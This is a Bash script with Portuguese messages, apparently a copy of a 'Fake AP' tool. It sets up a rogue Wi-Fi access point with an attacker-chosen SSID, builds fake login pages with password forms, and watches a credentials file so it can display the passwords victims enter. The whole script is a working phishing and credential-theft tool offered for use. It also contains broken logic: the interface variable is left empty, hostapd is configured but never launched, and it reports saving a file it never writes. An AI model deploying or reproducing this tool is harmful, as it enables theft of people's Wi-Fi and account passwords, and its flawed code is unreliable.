#!/bin/bash

dependencies() {
  command -v php > /dev/null 2>&1 || { echo >&2 "É necessário ter o PHP instalado. Por favor, instale-o."; exit 1; }
  command -v dnsmasq > /dev/null 2>&1 || { echo >&2 "É necessário ter o dnsmasq instalado. Por favor, instale-o."; exit 1; }
  command -v hostapd > /dev/null 2>&1 || { echo >&2 "É necessário ter o hostapd instalado. Por favor, instale-o."; exit 1; }
  command -v airmon-ng > /dev/null 2>&1 || { echo >&2 "É necessário ter o airmon-ng instalado. Por favor, instale-o."; exit 1; }
  command -v service > /dev/null 2>&1 || { echo >&2 "O comando 'service' não foi encontrado. Certifique-se de estar utilizando um sistema compatível."; exit 1; }
}

list_folders() {
  if [ ! -d "sites" ]; then
    mkdir sites
  fi

  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Pastas disponíveis:\e[0m\n"
  counter=1
  for folder in sites/*/; do
    login_page="$folder/login.php"
    if [[ -f "$login_page" ]]; then
      printf "\e[1;92m%s\e[0m: \e[1;77m%s (Página de Login Falsa)\n" $counter "$(basename "$folder")"
    else
      printf "\e[1;92m%s\e[0m: \e[1;77m%s\n" $counter "$(basename "$folder")"
    fi
    let counter++
  done
}

banner()  {
  printf "\e[1;77m8888888888       888                           \e[0m\e[1;92m[d8888 8888888b. \e[0m\n" 
  printf "\e[1;77m888              888                          \e[0m\e[1;92md88888 888   Y88b \e[0m\n"
  printf "\e[1;77m888              888                         \e[0m\e[1;92md88P888 888    888 \e[0m\n"
  printf "\e[1;77m8888888  8888b.  888  888  .d88b.           \e[0m\e[1;92md88P 888 888   d88P \e[0m\n"
  printf "\e[1;77m888          88b 888 .88P d8P  Y8b         \e[0m\e[1;92md88P  888 8888888P  \e[0m\n"
  printf "\e[1;77m888     .d888888 888888K  88888888 888888 \e[0m\e[1;92md88P   888 888        \e[0m\n"
  printf "\e[1;77m888     888  888 888  88b Y8b.           \e[0m\e[1;92md8888888888 888        \e[0m\n"
  printf "\e[1;77m888      Y888888 888  888   Y8888       \e[0m\e[1;92md88P     888 888\e[0m\e[1;77m v1.0\e[0m\n"
  printf "\n"
  printf "\e[1;93m                   .-  _           _  -. \n"
  printf "                  /   /             \   \ \n"
  printf "                 (   (  (\` (-o-) \`)  )   ) \n"
  printf "                  \   \_ \`  -+-  \` _/   / \n"
  printf "                   \`-       -+-       -\` \n"
  printf "                            -+- \e[0m\e[1;77mCoded by: @thelinuxchoice\e[0m\n"
  printf "\n"
}

createpage() {
  default_pass_text="Password"
  default_sub_text="Log-In"

  for site_folder in "$1"/*; do
    site_name=$(basename "$site_folder")
    index_path="sites/$site_name/index.html"
    mkdir -p "sites/$site_name"
    
    echo "<!DOCTYPE html>" > "$index_path"
    echo "<html>" >> "$index_path"
    echo "<body bgcolor=\"gray\" text=\"white\">" >> "$index_path"
    IFS=$'\n'
    
    for file in "$site_folder"/*; do
      if [ -f "$file" ]; then
        cat "$file" >> "$index_path"
        printf '<br>\n' >> "$index_path"
      fi
    done
    
    IFS=$'\n'
    printf '<form method="POST" action="%s"><label>%s </label>\n' "login.php" "$user_text" >> "$index_path"
    IFS=$'\n'
    printf '<br><label>%s: </label>' "$default_pass_text" >> "$index_path"
    IFS=$'\n'
    printf '<input type="password" name="password" length=64><br><br>\n' >> "$index_path"
    IFS=$'\n'
    printf '<input value="%s" type="submit"></form>\n' "$default_sub_text" >> "$index_path"
    printf '</center>' >> "$index_path"
    printf '<body>\n' >> "$index_path"
    printf '</html>\n' >> "$index_path"
  done
}

stop() {
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Encerrando todas as conexões..\n" 
  killall dnsmasq hostapd > /dev/null 2>&1
  sleep 4
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Reiniciando o Serviço de Rede..\n" 
  service networking restart
  sleep 5
}

start() {
  if [[ -e credentials.txt ]]; then
    rm -rf credentials.txt
  fi

  if [ ! -d "sites" ]; then
    mkdir sites
  fi

  find sites/ -maxdepth 1 -mindepth 1 -type d | awk -F '/' '{print $2}' | awk '{printf("\e[1;92m%d\e[0m: \e[1;77m%s\n", NR, $1)}'

  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escolha uma pasta pelo número:\e[0m ' chosen_folder_number
  chosen_folder=$(find sites/ -maxdepth 1 -mindepth 1 -type d | sed -n "${chosen_folder_number}p")

  if [ -z "$chosen_folder" ]; then
    printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Pasta inválida.\n"
    exit 1
  fi

  interface=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | tr -d ':' > iface)

  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] SSID a ser usado:\e[0m ' use_ssid
  read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Canal a ser usado:\e[0m ' use_channel

  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Configurando o access point...\n"

  service network-manager stop
  airmon-ng check kill
  ifconfig $interface down
  iwconfig $interface mode monitor
  ifconfig $interface up
  iwconfig $interface channel $use_channel
  iwconfig $interface essid $use_ssid
  ifconfig $interface up

  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configurando DHCP e DNS...\n"
  
  echo "interface=$interface" > hostapd.conf
  echo "driver=nl80211" >> hostapd.conf
  echo "ssid=$use_ssid" >> hostapd.conf
  echo "hw_mode=g" >> hostapd.conf
  echo "channel=$use_channel" >> hostapd.conf
  echo "macaddr_acl=0" >> hostapd.conf
  echo "auth_algs=1" >> hostapd.conf
  echo "ignore_broadcast_ssid=0" >> hostapd.conf
  
  dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
  sleep 5
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Access point configurado. Para parar: ./fakeap.sh --stop\n"
}

catch_cred() {
  IFS=$'\n'
  password=$(grep -o 'Pass:.*' credentials.txt | cut -d ":" -f2)
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m SSID:\e[0m\e[1;77m %s\n\e[0m" $use_ssid
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Senha:\e[0m\e[1;77m %s\n\e[0m" $password
  printf " SSID: %s\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Salvo:\e[0m\e[1;77m saved.credentials.txt\e[0m\n"
  stop
  exit 1
}

getcredentials() {
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Aguardando credenciais ...\e[0m\n"
  while [ true ]; do
    if [[ -e "credentials.txt" ]]; then
      printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credenciais Encontradas!\n"
      catch_cred
    fi
    sleep 1
  done 
}

case "$1" in
--stop)
  stop
  ;; 
*)
  banner 
  dependencies
  start
  ;; 
esac
